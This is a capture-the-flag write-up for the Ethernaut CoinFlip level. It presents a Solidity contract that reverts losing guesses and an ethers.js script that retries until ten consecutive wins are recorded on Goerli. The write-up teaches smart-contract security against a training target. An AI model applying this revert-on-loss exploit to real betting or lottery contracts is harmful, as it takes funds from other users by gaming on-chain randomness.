Level 3
==========================================================================================================================================

Deployment transaction: https://goerli.etherscan.io/tx/0x4970f628e73685e57d269bb5447ae599e8acdc257d2be4c7a5c68996c2893e48
Submission transaction: https://goerli.etherscan.io/tx/0x4bd7744e55814c26f7df3e1c2ee50f6777290d351eab40b4d2f8ebd98dba7fdc

-------
This challenge's task is to get 10 or more consecutive wins. 
Notice the CoinFlip contract returns true if the guess was correct and false if it wasn't. All we have to do is instantiate an exploit contract that can call the flip function and reverts whenever it receives a false returned value.
As the exploit contract reverts when it doesn't win, only 10 EVM state changes will happen.

#### Exploit contract:

The interface refers to Coinflip's flip function. Notice we define the return type for that function, otherwise we won't be allowed to compile this contract.
The attemptCoinFlip is a function that will revert if our guess returns a false response.
The target address is set to private due to the lack of any real use of having this internal/external nor public. It is a good safety practice to default stored values to private and only change this upon real need. Notice, though, that this private visibility does not mean the variable cannot be seem by third parties - it means cannot be called, even by contracts that inherit CoinFlipExploit.

```
    interface Coinflip{
        function flip(bool _guesss) external returns(bool);
    }

    contract CoinFlipExploit {
        address private target;

    constructor (address _target)  {
        target = _target;
    }

    function attemptCoinFlip() external{
        require(Coinflip(target).flip(true), "Wrong answer");
        
    }

}

```

#### The deployment script:
I've had a lot of fun. I wanted it to run automatically till I got all the 10 consecutive transactions and nothing else. For that to happen, I needed to check the consecutive wins amount every time the script ran:
```
    const consecutiveWins = await coinFlipContract.consecutiveWins();
```
Since it fetches on-chain data, this value would be automatically updated by the EVM if a successfull coinFlip attempt was pushed.

To not allow the script to run if the consecutiveWins was bigger than 9, wecreate a condition to exit the node.js process.
```
    if(consecutiveWins > 9 ){
        console.log(`Task already solved! Move on, mate!\n ------ `);
        process.exit();
    } 
```

To save ether, I only wanted to deploy the exploit contract once. So I checked the total amount of attempts, and if it was bigger than 0, we'd just refer to the already deployed contract.
```
    if (totalAttempts == 0){
      // deploy new exploit contract
      console.log(`Deploying coin flip exploit contract.\n ------ `)
      coinFlipExploitContract = await coinFlipExploitContractInterface.deploy( coinFlipContractAddress);
    
      console.log(`Coin flip exploit contract succesfully deployed at address ${coinFlipExploitContract.address}\n ------ \n`);
      globalCoinFlipExploitContractAddress = coinFlipExploitContract.address;
    
      } else {
      // use already deployed contract
        coinFlipExploitContract =new ethers.Contract(globalCoinFlipExploitContractAddress, CoinFlipExploitJson.abi, signer);
    
      }
```

Ethers.js usually stops scripts from running whenever a transaction attempt errors. The solution was to attempt anything inside try and catch blocks, meaning we would error would be handled and the script would not get stopped. 
```
    console.log(`Attempting to push coin flip transaction.\n ------ `);
    try{
        const coinFlipAttemptTx = await coinFlipExploitContract.attemptCoinFlip();
        const coinFlipAttemptTxReceipt = await coinFlipAttemptTx.wait();
        console.log(`Coinflip attempt succesfull\n ------ `);
    } catch(e){
        console.log(`Wrong answer\n ------ `);
        console.log(`${e}\n ------ `);
        
    }
```

Last but not least, we recursively call the script again and update the totalAttempts amount.
```
    main();
    }
  totalAttempts += 1;
```

Final result: 


Ethernaut level 3 - script made by JoVi

Checking consecutive wins amount

...

10!

...

136 attempts so far!

...

Task already solved! Move on, mate!

...

Done in 448.89s.






